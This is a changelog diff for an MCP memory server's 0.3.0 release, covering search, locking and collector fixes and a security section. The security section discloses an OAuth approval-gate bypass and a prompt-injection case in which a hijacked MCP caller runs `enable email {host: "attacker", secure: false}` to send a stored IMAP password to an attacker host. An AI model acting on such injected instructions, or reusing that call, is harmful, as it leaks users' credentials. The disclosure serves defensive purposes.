@@ -11,8 +11,12 @@ existing store gets a migration note here.
 
 ## [Unreleased]
 
-Security fixes from the 2026-10 whole-repo review. The memory file format
-is unchanged.
+## [0.3.0] — 2026-10-28
+
+Security fixes from the 2026-10 whole-repo review and the critical
+re-review that followed it, plus a re-weighted search default. The memory
+file format is unchanged. **The search index is rebuilt once on first
+start** (see below); access counts and last reads are kept.
 
 **Breaking changes:**
 
@@ -27,16 +31,84 @@ is unchanged.
 - **docker-compose now requires `MEMORIA_PUBLIC_URL`** in `.env` (the
   `.env.example` localhost value covers purely local use), so a remote
   deploy cannot silently pin OAuth discovery to a loopback issuer.
+- **Search ranks by relevance first.** The default weights moved from
+  `0.2·recency + 0.3·importance + 0.5·relevance` to
+  `0.8·relevance + 0.1·recency + 0.1·importance`. Relevance scores sit in a
+  narrow band while the priors span 0-1, so the old weights let recency
+  and importance decide most rankings; the retrieval eval measured the old
+  default at 33.1 nDCG@10 against 60.4 for the new one (hash provider;
+  see `mcp-server/eval/README.md`).
+- **MCP callers can only change a source's scheduling.** `memory_sources`
+  `enable`/`configure` accept `pollIntervalSec` and `importanceThreshold`;
+  hosts, credentials, paths and labels change only in the dashboard.
+- **`client_credentials` is refused while
+  `MEMORIA_AUTHORIZE_REQUIRE_APPROVAL=true`**, and a dashboard login no
+  longer approves by itself: `/authorize` shows a consent page and issues
+  the code when you click Approve.
+- **Dashboard consent and source-settings routes refuse OAuth tokens**
+  issued to MCP clients; use a dashboard login or the API key.
+- **Disabling a source in the dashboard withdraws its consent**; enabling
+  it again asks again.
+- **The store lock keeps a heartbeat.** A lock held by a live server on
+  another host is waited on, then refused; deployments that overlap
+  instances on one store by design (Cloud Run rollouts) set
+  `MEMORIA_LOCK_TAKEOVER=true`, as `deploy/gcp/cloudbuild.yaml` now does.
+
+### Security
+
+- The `/authorize` approval gate could be bypassed: `client_credentials`
+  minted a token from the client secret alone. It is now disabled (and no
+  longer advertised) while the gate is on. The gate's `memoria_approve`
+  cookie is `SameSite=Lax`, because browsers withhold `Strict` cookies on
+  the cross-site navigation from claude.ai, so the gate could never be
+  passed in a real browser. Because a Lax cookie is sent on any cross-site
+  navigation, it only unlocks a same-origin consent page whose
+  CSRF-bound POST issues the code (otherwise any page could trigger a
+  code for an attacker's pending flow). Each session cookie is honoured
+  only on its own path, and malformed or oversized PKCE challenges are
+  rejected before anything is stored.
+- A prompt-injected MCP caller could reuse a source's consent with its
+  own settings: `enable email {host: "attacker", secure: false}` sent the
+  stored IMAP password to the attacker in plaintext. Settings changes now
+  require the dashboard. Removing a custom source revokes its consent, so
+  a re-added source with the same id (another path or command) needs
+  consent again. An OAuth token could also call the dashboard's consent
+  and configure routes; those now need a dashboard login or the API key.
+- `pollIntervalSec` had no maximum: values past 2^31-1 ms made
+  setInterval fire every 1ms (back-to-back IMAP logins and API calls).
+  It is capped at one day.
+- Ingestion's dedup search embedded the first 200 raw characters of every
+  event before privacy enforcement, so with `MEMORIA_EMBEDDINGS=openai`
+  local-only content (calendar notes, account numbers) reached OpenAI even
+  though the daily log redacted it. Privacy is enforced first; local-only
+  events skip the similarity search.
+- Fingerprints that are written down (the ingest dedup sidecar,
+  provenance records, content-derived custom-source ids that reach the
+  synced daily log) are now HMACs under a key derived from the collector
+  master key; a bare SHA-256 of short local-only content was reversible
+  by guessing.
+- Dependencies: `npm audit` is clean (was 11 advisories, 1 critical and
+  6 high, including `proxy-addr`, `@modelcontextprotocol/sdk`,
+  `markdown-it`, `body-parser`, `zod` and `sharp`). Direct dependency
+  floors are raised to the fixed versions.
 
 ### Fixed
 
 - Bounded `memory_reflect`/`memory_compact` `days` and `max_chars`,
   `memory_ingest` `batch_size`, `memory_search` query length, and
   `memory_compile` tags/related; the compile size cap now measures bytes.
-- One server process per store: a second process opening the same store
-  fails at startup (store lock file, stale locks reclaimed), SQLite waits
-  on `busy_timeout`, and the compile queue drains by atomic rename so an
-  enqueue during a drain is no longer deleted unread.
+- One collector per store: the first server to open a store holds its
+  lock (stale locks reclaimed) and runs the collector and scheduled
+  maintenance; further servers on the same store (another Claude Code
+  window, Claude Desktop) run as secondaries that share the memories and
+  take over the lock when the primary exits (on one host only: a holder
+  on another host, e.g. a replica on a network mount, is still refused).
+  Multi-statement writes use IMMEDIATE transactions so concurrent writers
+  wait on `busy_timeout` instead of failing, and the compile queue drains
+  by atomic rename so an
+  enqueue during a drain is no longer deleted unread. The stdio server
+  exits when its client closes stdin; an orphaned server used to live on
+  (the file watcher kept it running) and hold the store.
 - The provenance archive stores non-`local-only` content encrypted under
   the collector master key instead of plaintext (older plaintext records
   still read back).
@@ -55,7 +127,117 @@ is unchanged.
   nested values dropped) so it cannot forge daily-log headings.
 - Optional `/authorize` approval gate:
   `MEMORIA_AUTHORIZE_REQUIRE_APPROVAL=true` requires a dashboard session
-  or the API key before a code is issued.
+  or the API key before a code is issued (and disables
+  `client_credentials`, see Security).
+- Recency was the time a chunk was indexed, so every edit, provider
+  switch or rebuild made every memory look new and restarted the decay
+  and staleness clocks. It now comes from frontmatter `updated` (else
+  `created`, else mtime) on a first index and from mtime when an indexed
+  file is edited, and re-embedding keeps a file's access history; an edit
+  counts as a touch for staleness and decay. Indexes built by earlier
+  versions are re-embedded once on start, keeping access counts and last
+  reads (a provider change keeps them too, where it used to drop them).
+  Only ISO dates are read from frontmatter.
+- A file whose body was emptied (frontmatter only) kept its old chunks, so
+  text deleted to redact it stayed searchable. Its chunks are now dropped.
+- A crash left a store lock naming the dead server's pid; in a restarted
+  container node usually gets the same pid, so the lock named the new
+  server itself and the store refused to open on every restart. Locks now
+  record the host and the holder's start time, carry a heartbeat (used
+  only for locks from another host), and are tracked per process by real
+  path, so a leftover or a reused pid is reclaimed while a live holder,
+  even one paused or asleep, never is; a server shutting down no longer
+  deletes a successor's lock, one that lost its lock says so, and a
+  reclaim race that could let two servers in is closed. Index state for
+  files deleted while the server was down is dropped at startup.
+- Collector sources marked enabled were never restarted after a server
+  restart (the dashboard still said "Enabled"), and the collector only
+  started when a collector tool, the dashboard or `/ingest` touched it.
+  Both servers now resume enabled sources at startup, in the background
+  and per source, retrying ones that fail every 10 minutes; lifecycle
+  operations on a source are serialized, so a resume racing a dashboard
+  enable no longer leaks a connection.
+- Adapter cursors only advance past what was collected, and are saved
+  after every successful poll instead of only on a clean shutdown; a
+  failed poll or buffer write restores the cursor. Shutdown, disable and
+  re-enable no longer save a live cursor a poll may have run ahead with.
+  - IMAP passed `uid: true` in the fetch query rather than its options,
+    so the UID cursor was matched against sequence numbers (polls returned
+    nothing, or only the newest message). It also never reconnected after
+    a dropped connection and swallowed every error. The cursor now records
+    UIDVALIDITY and restarts when the mailbox changes identity.
+  - Gmail jumped its cursor to the mailbox's current history id after the
+    first page and sliced off messages beyond `maxResults`, so a burst of
+    mail lost everything past the first batch; a failed message fetch was
+    dropped after the cursor moved.
+  - macOS Calendar never returned its first-poll window (init set the
+    cursor to "now"), lost every row past the 200th in a poll, and
+    reported query errors as an empty calendar. A full page tied on one
+    (sub-millisecond) modification time now moves on instead of repeating.
+- The dashboard's first-time setup for email and Google sources posted
+  their settings to `/enable` flat, where they landed beside `settings`
+  instead of in it, so those sources failed to start; and
+  `memory_priority` `set_threshold` wrote a field no adapter reads.
+- Re-enabling a running source re-initialised it without releasing the
+  old instance's connection or database handle.
+- `memory_lint`'s knowledge-gap check compared the blended search score to
+  a cut tied to the old ranking weights; it now gates on relevance.
+- Keyword search required every query word to appear in a chunk (FTS5's
+  implicit AND), so natural-language queries rarely matched; words are
+  now ORed, with BM25 ranking chunks that match more and rarer words
+  first (eval, hash provider: default 60.4 -> 61.7 nDCG@10, keyword only
+  53.8 -> 66.5).
+- One file that failed to index (an embedding API error, an over-limit
+  chunk) exited the server at startup and stopped the periodic sweep;
+  failures are now logged and skipped per file. Single lines longer than
+  a chunk are split. `memory_index` takes `force: true` to re-embed every
+  file. The lexical (hash) embedding keeps non-ASCII words.
+- HTTP: an unknown or expired MCP session gets 404 (the spec's signal to
+  re-initialize) instead of 400; request bodies on /mcp, /dashboard/api
+  and /ingest are parsed only after authentication (64KB elsewhere); at
+  the session cap the idlest session is closed instead of answering 503.
+  New `MEMORIA_TRUST_PROXY` (default 1) sets the proxy hop count.
+- The macOS Calendar adapter now tracks events by fingerprint over its
+  window, so events with no modification date and events that slide into
+  the look-ahead window are collected. IMAP fetches one batch per poll
+  instead of re-downloading the whole backlog.
+- Custom file watchers and shell commands emit only records they have
+  not read before (the checkpoint keeps the last read's record ids);
+  they re-emitted the whole file or output on every change.
+- Buffer: retention compared mismatched date formats and deleted rows up
+  to a day early; rows that cannot be decrypted (a changed master key)
+  blocked the ingest queue and are now held aside, kept, and released if
+  they decrypt again.
+- Fused activities are written once: the daemon fuses only events it
+  wrote, and an activity whose events were all fused already is skipped.
+- Entity pages for sources whose names slugify alike no longer overwrite
+  each other.
+- Multi-device sync no longer stalls on `MEMORY_INDEX.md`: the store
+  template union-merges it, and the pull hook resolves conflicts confined
+  to generated files (MEMORY_INDEX.md, and entity pages that carry the
+  `generated: auto-compiled` frontmatter on both sides) by itself. Daily
+  logs merged by union keep their frontmatter (a repeated key takes its
+  last value).
+- Daily-log paths refuse symlinks everywhere (writers and readers), and
+  `memory_compile` no longer leaks its directory lock on a refused path.
+- The sync push hook schedules a deferred push for the end of its rate
+  limit instead of leaving a session's last commits on the device; the
+  push runs in its own session, so the hook runner cannot kill it.
+- `deploy/gcp/deploy-demo.sh` could not start (production posture
+  checks) and ran two instances; fixed.
+- The Python ingestion hook no longer blocks `record_*` calls on the
+  network, sends at most 200 events per request (the `/ingest` limit),
+  and drops batches the server rejects with a 4xx instead of retrying
+  them forever.
+- The dashboard's consent dialog for a custom source shows the file it
+  reads or the command it runs, not only its (caller-chosen) name.
+- A failed build no longer overwrites `dist/` (`noEmitOnError`), so the
+  launcher really serves the previous build; the plugin's first install
+  uses `npm ci`.
+- Promotion (`boostImportance`) stops two points above a memory's own
+  importance; with every search result counting as an access, files
+  drifted to 10.
+- `docker-compose.yml` exposes `MEMORIA_TRUST_PROXY`.
 - Dashboard annotations use the atomic append helper; entity-page
   regeneration re-checks for human edits at write time; the custom
   file-watcher skips files over 10 MB instead of reading them whole.
@@ -373,7 +555,8 @@ so the public history starts here.
   from the SQLite index living on a FUSE mount — are listed in the
   [README](README.md#known-limitations) rather than glossed over.
 
-[Unreleased]: https://github.com/Agripp87/memoria_mcp/compare/v0.2.1...HEAD
+[Unreleased]: https://github.com/Agripp87/memoria_mcp/compare/v0.3.0...HEAD
+[0.3.0]: https://github.com/Agripp87/memoria_mcp/compare/v0.2.1...v0.3.0
 [0.2.1]: https://github.com/Agripp87/memoria_mcp/compare/v0.2.0...v0.2.1
 [0.2.0]: https://github.com/Agripp87/memoria_mcp/compare/v0.1.0...v0.2.0
 [0.1.0]: https://github.com/Agripp87/memoria_mcp/releases/tag/v0.1.0
